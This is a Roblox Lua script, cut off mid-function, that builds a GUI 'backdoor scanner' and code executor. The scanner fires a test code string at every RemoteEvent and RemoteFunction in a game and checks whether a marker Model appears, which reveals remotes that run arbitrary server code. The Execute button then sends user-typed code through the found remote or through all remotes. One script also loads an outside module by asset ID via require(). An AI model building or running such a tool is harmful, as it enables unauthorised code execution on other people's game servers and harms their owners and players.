RemoteHighlight_.Size = UDim2.new(1, 0, 1, 0)
RemoteHighlight_.ZIndex = 2
RemoteHighlight_.Font = Enum.Font.Code
RemoteHighlight_.Text = ""
RemoteHighlight_.TextColor3 = Color3.fromRGB(112, 255, 227)
RemoteHighlight_.TextSize = 14.000
RemoteHighlight_.TextXAlignment = Enum.TextXAlignment.Left
RemoteHighlight_.TextYAlignment = Enum.TextYAlignment.Top

Strings_.Name = "Strings_"
Strings_.Parent = Code
Strings_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Strings_.BackgroundTransparency = 1.000
Strings_.BorderColor3 = Color3.fromRGB(27, 42, 53)
Strings_.BorderSizePixel = 0
Strings_.Size = UDim2.new(1, 0, 1, 0)
Strings_.ZIndex = 2
Strings_.Font = Enum.Font.Code
Strings_.Text = ""
Strings_.TextColor3 = Color3.fromRGB(214, 157, 133)
Strings_.TextSize = 14.000
Strings_.TextXAlignment = Enum.TextXAlignment.Left
Strings_.TextYAlignment = Enum.TextYAlignment.Top

Numbers_.Name = "Numbers_"
Numbers_.Parent = Code
Numbers_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Numbers_.BackgroundTransparency = 1.000
Numbers_.BorderColor3 = Color3.fromRGB(27, 42, 53)
Numbers_.BorderSizePixel = 0
Numbers_.Size = UDim2.new(1, 0, 1, 0)
Numbers_.ZIndex = 2
Numbers_.Font = Enum.Font.Code
Numbers_.Text = ""
Numbers_.TextColor3 = Color3.fromRGB(181, 206, 168)
Numbers_.TextSize = 14.000
Numbers_.TextXAlignment = Enum.TextXAlignment.Left
Numbers_.TextYAlignment = Enum.TextYAlignment.Top

Comments_.Name = "Comments_"
Comments_.Parent = Code
Comments_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Comments_.BackgroundTransparency = 1.000
Comments_.BorderColor3 = Color3.fromRGB(27, 42, 53)
Comments_.BorderSizePixel = 0
Comments_.Size = UDim2.new(1, 0, 1, 0)
Comments_.ZIndex = 2
Comments_.Font = Enum.Font.Code
Comments_.Text = ""
Comments_.TextColor3 = Color3.fromRGB(87, 166, 74)
Comments_.TextSize = 14.000
Comments_.TextXAlignment = Enum.TextXAlignment.Left
Comments_.TextYAlignment = Enum.TextYAlignment.Top

Custom_.Name = "Custom_"
Custom_.Parent = Code
Custom_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Custom_.BackgroundTransparency = 1.000
Custom_.BorderColor3 = Color3.fromRGB(27, 42, 53)
Custom_.BorderSizePixel = 0
Custom_.Size = UDim2.new(1, 0, 1, 0)
Custom_.ZIndex = 2
Custom_.Font = Enum.Font.Code
Custom_.Text = ""
Custom_.TextColor3 = Color3.fromRGB(97, 175, 239)
Custom_.TextSize = 14.000
Custom_.TextXAlignment = Enum.TextXAlignment.Left
Custom_.TextYAlignment = Enum.TextYAlignment.Top

Tokens_.Name = "Tokens_"
Tokens_.Parent = Code
Tokens_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tokens_.BackgroundTransparency = 1.000
Tokens_.BorderColor3 = Color3.fromRGB(27, 42, 53)
Tokens_.BorderSizePixel = 0
Tokens_.Size = UDim2.new(1, 0, 1, 0)
Tokens_.ZIndex = 2
Tokens_.Font = Enum.Font.Code
Tokens_.Text = ""
Tokens_.TextColor3 = Color3.fromRGB(180, 180, 180)
Tokens_.TextSize = 14.000
Tokens_.TextXAlignment = Enum.TextXAlignment.Left
Tokens_.TextYAlignment = Enum.TextYAlignment.Top

Lines.Name = "Lines"
Lines.Parent = Scroll
Lines.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Lines.BackgroundTransparency = 1.000
Lines.BorderColor3 = Color3.fromRGB(27, 42, 53)
Lines.BorderSizePixel = 0
Lines.Size = UDim2.new(0.0289115645, 0, 1, 0)
Lines.Font = Enum.Font.SourceSans
Lines.Text = "  1"
Lines.TextColor3 = Color3.fromRGB(255, 255, 255)
Lines.TextSize = 14.000
Lines.TextXAlignment = Enum.TextXAlignment.Left
Lines.TextYAlignment = Enum.TextYAlignment.Top

LLine.Name = "LLine"
LLine.Parent = Scroll
LLine.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
LLine.BorderColor3 = Color3.fromRGB(27, 42, 53)
LLine.BorderSizePixel = 0
LLine.Position = UDim2.new(0.0350000001, 0, 0, 0)
LLine.Size = UDim2.new(0, 1, 1, 0)
LLine.ZIndex = 50

-- Scripts:

local function QWDVM_fake_script() -- Scan.LocalScript 
	local script = Instance.new('LocalScript', Scan)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local exec = script.Parent.Parent.Parent.Exec
	local scanner = script.Parent.Parent.Parent.Scanner
	local StarterGui = game:GetService("StarterGui")
	
	exec.Visible = false
	scanner.Visible = true
	button.ClipsDescendants = true
	
	local isAcquiring = false
	local AcquiredRemote = nil
	
	-- Ripple effect for button click
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
		local startTime = tick()
		local RemoteList = {}
		local CurrentRemote = nil
		local isFound = false
	
		if not isAcquiring then
			isAcquiring = true
	
			-- 1) First: collect remotes from ReplicatedStorage (priority)
			-- 2) Then: collect remotes from the whole game (excluding those already collected)
			-- This preserves original logic but tries likely candidates first.
	
			local seen = {} -- dedupe set
	
			-- Collect from ReplicatedStorage first
			for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
				if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not seen[obj] then
					table.insert(RemoteList, obj)
					seen[obj] = true
				end
			end
	
			-- Then collect from the whole game, skip ones already seen
			for _, obj in ipairs(game:GetDescendants()) do
				if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and not seen[obj] then
					table.insert(RemoteList, obj)
					seen[obj] = true
				end
			end
	
			-- Now test each remote in RemoteList in order (ReplicatedStorage ones first)
			for _, b in ipairs(RemoteList) do
				if AcquiredRemote == nil then
					-- generate random model name (kept same style as original)
					local NeededNameOfModel = string.char(
						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
						math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),
						math.random(0x0041,0x005A),math.random(0x0041,0x005A)
					)
	
					local NeededCode = 'Instance.new("Model",workspace).Name="'..NeededNameOfModel..'"'
					CurrentRemote = b
	
					-- Keep original behavior: send code regardless of remote's parent
					if b:IsA("RemoteEvent") then
						b:FireServer(NeededCode)
					elseif b:IsA("RemoteFunction") then
						task.spawn(function() b:InvokeServer(NeededCode) end)
					end
	
					task.wait(2.5)
	
					local created = workspace:FindFirstChild(NeededNameOfModel)
					if created and created:IsA("Model") then
						AcquiredRemote = b
					end
				end
			end
	
			local elapsed = string.format("%.3f", tick() - startTime)
	
			if AcquiredRemote ~= nil then
				isFound = true
				exec.Visible = true
				scanner.Visible = false
				StarterGui:SetCore("SendNotification", {
					Title = "Backdoor found!",
					Text = "Time to find backdoor: "..elapsed.." seconds",
					Icon = "rbxassetid://109509735989414",
					Duration = 5
				})
			else
				isFound = false
				StarterGui:SetCore("SendNotification", {
					Title = "No backdoors :(",
					Text = "There are no working backdoors in the game",
					Duration = 4
				})
			end
	
			isAcquiring = false
		end
	end)
	
end
coroutine.wrap(QWDVM_fake_script)()
local function NXTQEN_fake_script() -- Scanner.LocalScript 
	local script = Instance.new('LocalScript', Scanner)

	function dragify(Main)
		local dragToggle = false
		local dragInput = nil
		local dragStart = nil
		local startPos = nil
		local dragSpeed = 1
		local UserInputService = game:GetService("UserInputService")
		local TweenService = game:GetService("TweenService")
	
		local function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(
				startPos.X.Scale, startPos.X.Offset + Delta.X,
				startPos.Y.Scale, startPos.Y.Offset + Delta.Y
			)
			TweenService:Create(Main, TweenInfo.new(dragSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = Position}):Play()
		end
	
		Main.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragToggle = true
				dragStart = input.Position
				startPos = Main.Position
	
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
	
		Main.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
	
		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(NXTQEN_fake_script)()
-- Exec.Highlighter is disabled.
local function NYJOUPU_fake_script() -- Exec.LocalScript 
	local script = Instance.new('LocalScript', Exec)

	function dragify(Main)
		local dragToggle = false
		local dragInput = nil
		local dragStart = nil
		local startPos = nil
		local dragSpeed = 1
		local UserInputService = game:GetService("UserInputService")
		local TweenService = game:GetService("TweenService")
	
		local function updateInput(input)
			local Delta = input.Position - dragStart
			local Position = UDim2.new(
				startPos.X.Scale, startPos.X.Offset + Delta.X,
				startPos.Y.Scale, startPos.Y.Offset + Delta.Y
			)
			TweenService:Create(Main, TweenInfo.new(dragSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = Position}):Play()
		end
	
		Main.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragToggle = true
				dragStart = input.Position
				startPos = Main.Position
	
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
	
		Main.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
	
		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(NYJOUPU_fake_script)()
local function VDNRL_fake_script() -- Execute.LocalScript 
	local script = Instance.new('LocalScript', Execute)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local editor = script.Parent.Parent.Scroll.Code
	local StarterGui = game:GetService("StarterGui")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	local AcquiredRemote = nil 
	local IsAcquiring = false 
	
	
	button.MouseButton1Click:Connect(function()
		createRipple()
		local CodeStr = editor.Text
		local InvokeFunc = Instance.new("BindableEvent")
		InvokeFunc.Event:Connect(function(rfunc,codestr2)
			rfunc:InvokeServer(codestr2)
		end)
		local function DeepFire(inst)
			if not IsAcquiring then 
				if AcquiredRemote == nil then 
					for _, childy in inst:GetChildren() do
						if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
							if childy:IsA("RemoteEvent") then
								childy:FireServer(CodeStr)
							elseif childy:IsA("RemoteFunction") then
								InvokeFunc:Fire(childy, CodeStr)
							end
						end
						DeepFire(childy)
					end 
				else 
					if AcquiredRemote:IsA("RemoteEvent") then 
						AcquiredRemote:FireServer(CodeStr) 
					elseif AcquiredRemote:IsA("RemoteFunction") then 
						task.spawn(function() AcquiredRemote:InvokeServer(CodeStr) end) 
					end
				end 
			end
		end
		DeepFire(game)
	end)
end
coroutine.wrap(VDNRL_fake_script)()
local function JWXWEUG_fake_script() -- Clear.LocalScript 
	local script = Instance.new('LocalScript', Clear)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	-- Ustal ścieżkę do edytora tekstu
	local codeBox = button.Parent.Scroll.Code -- Zmień ścieżkę jeśli Twój GUI jest inaczej zorganizowany
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	
		-- Wyczyść tekst z edytora
		if codeBox and codeBox:IsA("TextBox") then
			codeBox.Text = ""
		end
	end)
end
coroutine.wrap(JWXWEUG_fake_script)()
local function PPNCOY_fake_script() -- R6.LocalScript 
	local script = Instance.new('LocalScript', R6)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(PPNCOY_fake_script)()
local function VTAO_fake_script() -- R6.Script 
	local script = Instance.new('Script', R6)

	script.Parent.MouseButton1Down:Connect(function(x: number, y: number) 
		local plr = script.Parent.Parent.Parent.Parent.Parent
		if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
			local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
			local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R6)
			morph:SetPrimaryPartCFrame(plr.Character.PrimaryPart.CFrame)
			morph.Name = plr.Name
			plr.Character = morph
			morph.Parent = workspace    
		end
	end)
end
coroutine.wrap(VTAO_fake_script)()
local function VOEF_fake_script() -- Reset.LocalScript 
	local script = Instance.new('LocalScript', Reset)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(VOEF_fake_script)()
local function AHKT_fake_script() -- Reset.Script 
	local script = Instance.new('Script', Reset)

	script.Parent.MouseButton1Down:Connect(function(x: number, y: number) 
		script.Parent.Parent.Parent.Parent.Parent:LoadCharacter()
	end)
end
coroutine.wrap(AHKT_fake_script)()
local function EBSQKS_fake_script() -- ScriptHuB.LocalScript 
	local script = Instance.new('LocalScript', ScriptHuB)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
	local scriptframe = script.Parent.Parent.Scripthub
	local visibleF = false
	
	button.MouseButton1Click:Connect(function()
		if visibleF == false then
			scriptframe.Visible = true
			visibleF = true
		else
			scriptframe.Visible = false
			visibleF = false
		end	
	end)
end
coroutine.wrap(EBSQKS_fake_script)()
local function TRJOCX_fake_script() -- Polaria.LocalScript 
	local script = Instance.new('LocalScript', Polaria)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(TRJOCX_fake_script)()
local function HCMCKVB_fake_script() -- Polaria.Script 
	local script = Instance.new('Script', Polaria)

	script.Parent.RemoteEvent.OnServerEvent:Connect(function(plr)
		require(121550031249356).Load(plr.Name)
	end)
end
coroutine.wrap(HCMCKVB_fake_script)()
local function XYQLV_fake_script() -- Polaria.LocalScript 
	local script = Instance.new('LocalScript', Polaria)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.RemoteEvent:FireServer()
	end)
end
coroutine.wrap(XYQLV_fake_script)()
local function RPMTHX_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(RPMTHX_fake_script)()
local function OHMMBOR_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(OHMMBOR_fake_script)()
local function PKMSU_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(PKMSU_fake_script)()
local function IRSZC_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(IRSZC_fake_script)()
local function OJOGTP_fake_script() -- TextButton_5.LocalScript 
	local script = Instance.new('LocalScript', TextButton_5)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(OJOGTP_fake_script)()
local function PYALXL_fake_script() -- TextButton_6.LocalScript 
	local script = Instance.new('LocalScript', TextButton_6)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(PYALXL_fake_script)()
local function BRDH_fake_script() -- TextButton_7.LocalScript 
	local script = Instance.new('LocalScript', TextButton_7)

	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end
coroutine.wrap(BRDH_fake_script)()
local function GIXSGWU_fake_script() -- TextButton_8.LocalScript 
